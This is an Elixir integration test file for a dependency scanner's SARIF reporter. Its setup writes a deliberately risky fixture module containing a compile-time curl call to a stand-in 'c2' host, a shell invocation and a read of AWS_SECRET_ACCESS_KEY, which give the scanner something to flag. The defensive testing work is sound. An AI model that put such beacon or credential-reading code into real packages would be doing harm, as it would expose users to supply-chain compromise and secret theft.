defmodule VetReporter.Integration.SarifIntegrationTest do
  @moduledoc """
  End-to-end integration tests for the SARIF reporter.

  These tests run the REAL scanner against a fixture project, then encode
  the `ScanReport` as SARIF and validate the output against the contract
  GitHub Code Scanning expects:

    * `$schema`, `version`, `runs` structure.
    * Every `ruleId` in results links to a rule in `tool.driver.rules`.
    * Every `level` is a valid SARIF level.
    * Every finding category produced by the scanner is represented.
    * When the scanner is invoked with `patches: true`, the SARIF output
      carries `fixes` on the appropriate results.

  Crucially, this test exercises the full pipeline — lock parser, tree
  builder, checks, scorer, allowlist, reporter — which is the only place
  we can catch regressions that only surface once all phases are wired up.
  """

  use ExUnit.Case, async: true

  alias VetCore.Types.ScanReport
  alias VetReporter.Sarif

  setup do
    tmp =
      Path.join(
        System.tmp_dir!(),
        "vet_sarif_integration_#{System.unique_integer([:positive])}"
      )

    File.mkdir_p!(tmp)
    on_exit(fn -> File.rm_rf!(tmp) end)

    # A dep that'll trigger a handful of checks.
    dep_dir = Path.join([tmp, "deps", "risky_dep", "lib"])
    File.mkdir_p!(dep_dir)

    File.write!(Path.join(dep_dir, "risky.ex"), ~S"""
    defmodule Risky do
      @beacon System.cmd("curl", ["https://example.test/c2"])

      def exec do
        System.cmd("sh", ["-c", "true"])
      end

      def token do
        System.get_env("AWS_SECRET_ACCESS_KEY")
      end
    end
    """)

    File.write!(Path.join([tmp, "deps", "risky_dep", "mix.exs"]), ~S"""
    defmodule RiskyDep.MixProject do
      use Mix.Project
      def project, do: [app: :risky_dep, version: "0.1.0"]
    end
    """)

    File.write!(
      Path.join(tmp, "mix.lock"),
      ~s(%{\n  "risky_dep": {:hex, :risky_dep, "0.1.0", "a", [:mix], [], "hexpm", "b"},\n})
    )

    %{project_path: tmp}
  end

  defp scan!(path, opts \\ []) do
    base = [skip_hex: true, skip_history: true]
    {:ok, report} = VetCore.scan(path, Keyword.merge(base, opts))
    report
  end

  describe "SARIF end-to-end: real scan → build/1" do
    test "produces a well-formed SARIF document", %{project_path: path} do
      report = scan!(path)
      assert %ScanReport{} = report

      doc = Sarif.build(report)
      assert doc["version"] == "2.1.0"
      assert is_list(doc["runs"])
      [run] = doc["runs"]
      assert is_map(run)
    end

    test "every result's ruleId exists in tool.driver.rules", %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]
      rule_ids = run["tool"]["driver"]["rules"] |> Enum.map(& &1["id"]) |> MapSet.new()

      for r <- run["results"] do
        assert MapSet.member?(rule_ids, r["ruleId"]),
               "result ruleId #{r["ruleId"]} not in rules #{inspect(rule_ids)}"
      end
    end

    test "every result.level is a valid SARIF level", %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]

      for r <- run["results"] do
        assert r["level"] in ["note", "warning", "error", "none"]
      end
    end

    test "result count equals total findings in the scan", %{project_path: path} do
      report = scan!(path)
      doc = Sarif.build(report)
      [run] = doc["runs"]

      expected = report.dependency_reports |> Enum.map(&length(&1.findings)) |> Enum.sum()
      assert length(run["results"]) == expected
    end

    test "every result carries evidence_level in properties", %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]

      for r <- run["results"] do
        assert is_binary(r["properties"]["evidence_level"]),
               "missing evidence_level on result #{inspect(r)}"
      end
    end

    test "every result carries dep_name and risk fields in properties", %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]

      for r <- run["results"] do
        assert is_binary(r["properties"]["dep_name"])
        assert is_integer(r["properties"]["risk_score"])
        assert is_binary(r["properties"]["risk_level"])
      end
    end

    test "compile-time finding from our fixture surfaces with compile_time: true",
         %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]

      # @beacon = System.cmd in module body → compile_time = true.
      assert Enum.any?(run["results"], fn r ->
               r["properties"]["compile_time"] == true and r["properties"]["dep_name"] == "risky_dep"
             end)
    end

    test "working directory URI is file://<project_path>", %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]
      [inv] = run["invocations"]

      assert inv["workingDirectory"]["uri"] == "file://" <> path
    end

    test "ruleIds cover all distinct check_ids fired by the scanner", %{project_path: path} do
      report = scan!(path)
      doc = Sarif.build(report)
      [run] = doc["runs"]

      expected =
        report.dependency_reports
        |> Enum.flat_map(& &1.findings)
        |> Enum.map(& &1.check_id)
        |> Enum.uniq()
        |> Enum.map(&Atom.to_string/1)
        |> MapSet.new()

      actual = run["tool"]["driver"]["rules"] |> Enum.map(& &1["id"]) |> MapSet.new()
      assert MapSet.equal?(expected, actual)
    end
  end

  describe "SARIF end-to-end: encode/1 JSON round-trip" do
    test "encoded JSON parses back to the same logical structure", %{project_path: path} do
      report = scan!(path)
      json = Sarif.encode(report)

      assert {:ok, decoded} = Jason.decode(json)
      assert decoded["version"] == "2.1.0"

      # Sanity: same number of runs + results on both sides.
      original = Sarif.build(report)
      assert length(decoded["runs"]) == length(original["runs"])

      [decoded_run] = decoded["runs"]
      [original_run] = original["runs"]
      assert length(decoded_run["results"]) == length(original_run["results"])
    end

    test "encoded JSON is non-empty, pretty-printed, starts with `{`", %{project_path: path} do
      json = path |> scan!() |> Sarif.encode()

      assert String.starts_with?(json, "{")
      assert String.contains?(json, "\n")
      assert String.length(json) > 100
    end
  end

  describe "SARIF end-to-end: fixes attachment with patches enabled" do
    test "scan with patches:true produces fixes on relevant results", %{project_path: path} do
      report = scan!(path, patches: true, verify_patches: false)
      doc = Sarif.build(report)
      [run] = doc["runs"]

      # Our fixture has compile-time system_exec → remove_dependency patch
      # → every result on that dep carries a fix (since remove_dependency
      # is "relevant" to all categories on the same dep).
      risky_results =
        Enum.filter(run["results"], fn r -> r["properties"]["dep_name"] == "risky_dep" end)

      assert risky_results != []

      fixes_present = Enum.filter(risky_results, &Map.has_key?(&1, "fixes"))
      assert length(fixes_present) >= 1

      # Every attached fix has action, rationale, diff.
      for r <- fixes_present, fix <- r["fixes"] do
        assert is_binary(fix["description"]["text"])
        assert is_binary(fix["properties"]["action"])
        assert is_binary(fix["properties"]["diff"])
      end
    end

    test "scan without patches:true produces no fixes", %{project_path: path} do
      doc = path |> scan!() |> Sarif.build()
      [run] = doc["runs"]

      for r <- run["results"] do
        refute Map.has_key?(r, "fixes")
      end
    end
  end

  describe "SARIF render/1" do
    test "writes parseable JSON to stdout for a real scan", %{project_path: path} do
      report = scan!(path)

      output = ExUnit.CaptureIO.capture_io(fn -> Sarif.render(report) end)

      assert {:ok, decoded} = Jason.decode(output)
      assert decoded["version"] == "2.1.0"
      [run] = decoded["runs"]
      assert is_list(run["results"])
    end
  end
end
